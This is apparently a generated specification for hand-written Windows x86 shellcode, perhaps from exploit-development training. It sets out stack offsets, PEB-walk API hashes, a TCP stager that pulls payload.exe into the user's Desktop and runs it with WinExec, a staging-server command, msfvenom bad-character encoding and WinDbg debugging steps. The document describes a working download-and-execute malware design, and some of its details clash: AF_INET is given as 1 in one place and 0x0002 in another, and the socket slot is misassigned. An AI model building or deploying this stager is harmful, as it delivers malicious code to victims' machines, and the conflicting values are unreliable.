# Shellcode Contract

Generated from manifest.

---

# Stack Layout

Frame: `mov ebp, esp` / `sub esp, 0x300` (0x300 bytes reserved)

## Export Context (reserved - do not allocate)

| Offset | Description |
|--------|-------------|
| `[ebp-0x04]` | Module base (transient) |
| `[ebp-0x08]` | AddressOfNames VA |
| `[ebp-0x0c]` | AddressOfNameOrdinals VA |
| `[ebp-0x10]` | AddressOfFunctions VA |
| `[ebp-0x14]` | NumberOfNames |
| `[ebp-0x18]` | Target hash (transient) |

## Module Bases

| Offset | Module |
|--------|--------|
| `[ebp-0x20]` | kernel32.dll |
| `[ebp-0x24]` | ws2_32.dll |
| `[ebp-0x28]` | advapi32.dll |

## API Table

| Offset | API | Module |
|--------|-----|--------|
| `[ebp-0x2c]` | LoadLibraryA | kernel32.dll |
| `[ebp-0x30]` | GetUserNameA | advapi32.dll |
| `[ebp-0x34]` | WSAStartup | ws2_32.dll |
| `[ebp-0x38]` | WSASocketA | ws2_32.dll |
| `[ebp-0x3c]` | connect | ws2_32.dll |
| `[ebp-0x40]` | recv | ws2_32.dll |
| `[ebp-0x44]` | closesocket | ws2_32.dll |
| `[ebp-0x48]` | VirtualAlloc | kernel32.dll |
| `[ebp-0x4c]` | CreateFileA | kernel32.dll |
| `[ebp-0x50]` | WriteFile | kernel32.dll |
| `[ebp-0x54]` | CloseHandle | kernel32.dll |
| `[ebp-0x58]` | WinExec | kernel32.dll |
| `[ebp-0x5c]` | ExitProcess | kernel32.dll |

## Variables

| Offset | Variable | Size |
|--------|----------|------|
| `[ebp-0x60]` | username_len | 4 |
| `[ebp-0x64]` | write_pos | 4 |
| `[ebp-0x68]` | path_buf | 4 |
| `[ebp-0x6c]` | guna_ret | 4 |
| `[ebp-0x70]` | recv_size | 4 |
| `[ebp-0x74]` | bytes_recvd | 4 |
| `[ebp-0x78]` | bytes_written | 4 |
| `[ebp-0x7c]` | recv_buf_ptr | 4 |
| `[ebp-0x80]` | remaining | 4 |
| `[ebp-0x84]` | wsa_ret | 4 |
| `[ebp-0x88]` | socket_handle | 4 |
| `[ebp-0x8c]` | conn_ret | 4 |
| `[ebp-0x90]` | recv_hdr_ret | 4 |
| `[ebp-0x94]` | virt_buf | 4 |
| `[ebp-0x98]` | recv_ret | 4 |
| `[ebp-0x9c]` | file_handle | 4 |
| `[ebp-0xa0]` | write_ret | 4 |
| `[ebp-0xa4]` | exec_ret | 4 |

## Structures

| Offset | Structure | Size |
|--------|-----------|------|
| `[ebp-0x290]` | WSADATA | 0x190 |
| `[ebp-0x2a0]` | sockaddr_in | 0x10 |

## Strings

| Offset | Label | Value | Size |
|--------|-------|-------|------|
| `[ebp-0x2b0]` | advapi_dll | advapi32.dll | 16 |
| `[ebp-0x2bc]` | path_prefix | C:\Users\ | 12 |
| `[ebp-0x2d4]` | path_suffix | \Desktop\payload.exe | 24 |

---

# API Contracts

## kernel32.dll

Resolution: PEB walk

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| LoadLibraryA | `0xec0e4e8e` | `[ebp-0x2c]` | library |
| VirtualAlloc | `0x91afca54` | `[ebp-0x48]` | memory |
| CreateFileA | `0x7c0017a5` | `[ebp-0x4c]` | filesystem |
| WriteFile | `0xe80a791f` | `[ebp-0x50]` | filesystem |
| CloseHandle | `0x0ffd97fb` | `[ebp-0x54]` | synchronization |
| WinExec | `0x0e8afe98` | `[ebp-0x58]` | process |
| ExitProcess | `0x73e2d87e` | `[ebp-0x5c]` | process |

### API Details

#### LoadLibraryA

**Slot:** `[ebp-0x2c]`
**Hash:** `0xec0e4e8e`
**Module:** kernel32.dll
**Category:** library

```c
HMODULE LoadLibraryA(LPCSTR lpLibFileName)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpLibFileName | LPCSTR | e.g. ws2_32.dll |

---

#### VirtualAlloc

**Slot:** `[ebp-0x48]`
**Hash:** `0x91afca54`
**Module:** kernel32.dll
**Category:** memory

```c
LPVOID VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpAddress | LPVOID | NULL to let OS choose; or preferred address |
| 2 | dwSize | SIZE_T | size of region in bytes |
| 3 | flAllocationType | DWORD | MEM_COMMIT|MEM_RESERVE = 0x3000 |
| 4 | flProtect | DWORD | PAGE_EXECUTE_READWRITE = 0x40 |

---

#### CreateFileA

**Slot:** `[ebp-0x4c]`
**Hash:** `0x7c0017a5`
**Module:** kernel32.dll
**Category:** filesystem

```c
HANDLE CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpFileName | LPCSTR |  |
| 2 | dwDesiredAccess | DWORD | GENERIC_READ=0x80000000, GENERIC_WRITE=0x40000000 |
| 3 | dwShareMode | DWORD | 0 for exclusive |
| 4 | lpSecurityAttributes | LPSECURITY_ATTRIBUTES | NULL |
| 5 | dwCreationDisposition | DWORD | OPEN_EXISTING=3, CREATE_ALWAYS=2 |
| 6 | dwFlagsAndAttributes | DWORD | FILE_ATTRIBUTE_NORMAL=0x80 |
| 7 | hTemplateFile | HANDLE | NULL |

---

#### WriteFile

**Slot:** `[ebp-0x50]`
**Hash:** `0xe80a791f`
**Module:** kernel32.dll
**Category:** filesystem

```c
BOOL WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hFile | HANDLE | handle from CreateFileA |
| 2 | lpBuffer | LPCVOID | pointer to source buffer |
| 3 | nNumberOfBytesToWrite | DWORD | number of bytes to write |
| 4 | lpNumberOfBytesWritten | LPDWORD | pointer to DWORD for bytes written; NULL if lpOverlapped set |
| 5 | lpOverlapped | LPOVERLAPPED | NULL for synchronous I/O |

---

#### CloseHandle

**Slot:** `[ebp-0x54]`
**Hash:** `0x0ffd97fb`
**Module:** kernel32.dll
**Category:** synchronization

```c
BOOL CloseHandle(HANDLE hObject)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hObject | HANDLE | handle to close; returns nonzero on success |

---

#### WinExec

**Slot:** `[ebp-0x58]`
**Hash:** `0x0e8afe98`
**Module:** kernel32.dll
**Category:** process

```c
UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpCmdLine | LPCSTR | pointer to command string, e.g. cmd.exe |
| 2 | uCmdShow | UINT | SW_SHOWNORMAL = 1 or SW_HIDE = 0 |

---

#### ExitProcess

**Slot:** `[ebp-0x5c]`
**Hash:** `0x73e2d87e`
**Module:** kernel32.dll
**Category:** process

```c
VOID ExitProcess(UINT uExitCode)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | uExitCode | UINT | 0 for clean exit |

---

## ws2_32.dll

Resolution: `LoadLibraryA("ws2_32.dll")` -> base stored at `[ebp-0x24]`

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| WSAStartup | `0x3bfcedcb` | `[ebp-0x34]` | network |
| WSASocketA | `0xadf509d9` | `[ebp-0x38]` | network |
| connect | `0x60aaf9ec` | `[ebp-0x3c]` | network |
| recv | `0xe71819b6` | `[ebp-0x40]` | network |
| closesocket | `0x79c679e7` | `[ebp-0x44]` | network |

### API Details

#### WSAStartup

**Slot:** `[ebp-0x34]`
**Hash:** `0x3bfcedcb`
**Module:** ws2_32.dll
**Category:** network

```c
int WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | wVersionRequested | WORD | MAKEWORD(2,2) = 0x0202 |
| 2 | lpWSAData | LPWSADATA | output buffer, allocate 0x190 bytes on stack |

---

#### WSASocketA

**Slot:** `[ebp-0x38]`
**Hash:** `0xadf509d9`
**Module:** ws2_32.dll
**Category:** network

```c
SOCKET WSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | af | int | AF_INET = 1 |
| 2 | type | int | SOCK_STREAM = 1 |
| 3 | protocol | int | IPPROTO_TCP = 6 |
| 4 | lpProtocolInfo | LPWSAPROTOCOL_INFOA | NULL |
| 5 | g | GROUP | NULL |
| 6 | dwFlags | DWORD | NULL |

---

#### connect

**Slot:** `[ebp-0x3c]`
**Hash:** `0x60aaf9ec`
**Module:** ws2_32.dll
**Category:** network

```c
int connect(SOCKET s, const struct sockaddr *name, int namelen)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | s | SOCKET | socket handle from WSASocketA; stored at [ebp-0x40] |
| 2 | name | const struct sockaddr * | pointer to sockaddr_in on stack |
| 3 | namelen | int | 0x10 |

---

#### recv

**Slot:** `[ebp-0x40]`
**Hash:** `0xe71819b6`
**Module:** ws2_32.dll
**Category:** network

```c
int recv(SOCKET s, char *buf, int len, int flags)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | s | SOCKET | connected socket handle |
| 2 | buf | char * | pointer to receive buffer |
| 3 | len | int | size of buffer in bytes |
| 4 | flags | int | 0 for default behaviour |

---

#### closesocket

**Slot:** `[ebp-0x44]`
**Hash:** `0x79c679e7`
**Module:** ws2_32.dll
**Category:** network

```c
int closesocket(SOCKET s)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | s | SOCKET | socket handle to close |

---

## advapi32.dll

Resolution: `LoadLibraryA("advapi32.dll")` -> base stored at `[ebp-0x28]`

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| GetUserNameA | `0x5c52aa34` | `[ebp-0x30]` | identity |

### API Details

#### GetUserNameA

**Slot:** `[ebp-0x30]`
**Hash:** `0x5c52aa34`
**Module:** advapi32.dll
**Category:** identity

```c
BOOL GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpBuffer | LPSTR | pointer to buffer receiving the username |
| 2 | pcbBuffer | LPDWORD | pointer to DWORD: in=buffer size, out=chars copied including null |

---

---

# Structure Layouts

## WSADATA

**Size:** `0x190`
**Required by:** WSAStartup

_No field documentation (opaque output buffer)._

---

## sockaddr_in

**Size:** `0x10`
**Required by:** connect

| Offset | Field | Size | Notes |
|--------|-------|------|-------|
| `+0x00` | sin_family | 2 | AF_INET = 0x0002 |
| `+0x02` | sin_port | 2 | network byte order, e.g. 0x2329 = port 9001 |
| `+0x04` | sin_addr | 4 | network byte order IPv4 address |
| `+0x08` | sin_zero | 8 | zeroed padding |

---

---

# Operational Cheatsheet

**Template:** IRTcpDownloadToUserpathTemplate
**Target:** `127.0.0.1:4444`
**Bad characters:** `0x00` `0x0a` `0x0d`

## Setup Commands

**Start staging server:**
```
python3 tcp_stage_server.py --bind 127.0.0.1 --port 4444 payload.exe
```

**Target path:**
```
C:\Users\<username>\Desktop\payload.exe
```

## Encoding (if needed)

Remove bad chars with msfvenom (requires `shellcode.bin`):
```
cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python -v shellcode
```

---

# WinDbg Cheatsheet

Run `debug_runner.py` under 32-bit Python. Attach WinDbg to the
python.exe process. Set `bp <address>` using the printed shellcode
address, then press Enter in the script to start execution.

## Quick Reference

| Command | Description |
|---------|-------------|
| `bp <addr>` | Set breakpoint |
| `bl` | List breakpoints |
| `g` | Go (continue) |
| `t` | Step into |
| `p` | Step over |
| `pt` | Step to next return |
| `r` | Show all registers |
| `r eax` | Show one register |
| `u eip L10` | Disassemble next 16 instructions |
| `db <addr> L<n>` | Dump bytes |
| `dd <addr> L<n>` | Dump dwords |
| `da <addr>` | Dump ASCII string |
| `!address <addr>` | Show memory region info |

## Inspect API Pointers After Resolution

After the PEB walk and hash resolution, each resolved function
pointer is stored at its stack slot. Verify with:

```
dd ebp-0x2c L1    ; LoadLibraryA
dd ebp-0x30 L1    ; GetUserNameA
dd ebp-0x34 L1    ; WSAStartup
dd ebp-0x38 L1    ; WSASocketA
dd ebp-0x3c L1    ; connect
dd ebp-0x40 L1    ; recv
dd ebp-0x44 L1    ; closesocket
dd ebp-0x48 L1    ; VirtualAlloc
dd ebp-0x4c L1    ; CreateFileA
dd ebp-0x50 L1    ; WriteFile
dd ebp-0x54 L1    ; CloseHandle
dd ebp-0x58 L1    ; WinExec
dd ebp-0x5c L1    ; ExitProcess
```

## Inspect Structures Before API Calls

### WSADATA (0x190 bytes)

Base address: `ebp-0x290`

```
dd ebp-0x290 L8    ; first 8 dwords
db ebp-0x290 L20    ; raw bytes
```

### sockaddr_in (0x10 bytes)

Base address: `ebp-0x2a0`

```
dd ebp-0x2a0 L4    ; first 4 dwords
db ebp-0x2a0 L10    ; raw bytes
```

Key fields:

- `db ebp-0x2a0 L2`  sin_family (+0x00)
- `db ebp-0x29e L2`  sin_port (+0x02)
- `dd ebp-0x29c L1`  sin_addr (+0x04)
- `dd ebp-0x298 L1`  sin_zero (+0x08)

## Inspect Stack Strings

```
da ebp-0x2b0    ; advapi_dll
```

```
da ebp-0x2bc    ; path_prefix
```

```
da ebp-0x2d4    ; path_suffix
```

## Breakpoint Strategy

Set breakpoints at each `call [ebp-0xNN]` in the generated
assembly to pause before each API call. After each call, check
`eax` for the return value:

```
bp <sc_base>+<offset_of_call_LoadLibraryA>
bp <sc_base>+<offset_of_call_GetUserNameA>
bp <sc_base>+<offset_of_call_WSAStartup>  ; eax=0 on success
bp <sc_base>+<offset_of_call_WSASocketA>  ; eax=socket handle (not INVALID_SOCKET)
bp <sc_base>+<offset_of_call_connect>  ; eax=0 on success
bp <sc_base>+<offset_of_call_recv>
bp <sc_base>+<offset_of_call_closesocket>
bp <sc_base>+<offset_of_call_VirtualAlloc>
bp <sc_base>+<offset_of_call_CreateFileA>
bp <sc_base>+<offset_of_call_WriteFile>
bp <sc_base>+<offset_of_call_CloseHandle>
bp <sc_base>+<offset_of_call_WinExec>  ; eax>31 on success
bp <sc_base>+<offset_of_call_ExitProcess>  ; does not return
```

Find the call offsets by searching `generated.asm` for
`call [ebp-` instructions. Add the instruction's line offset
from the start of the shellcode to the base address.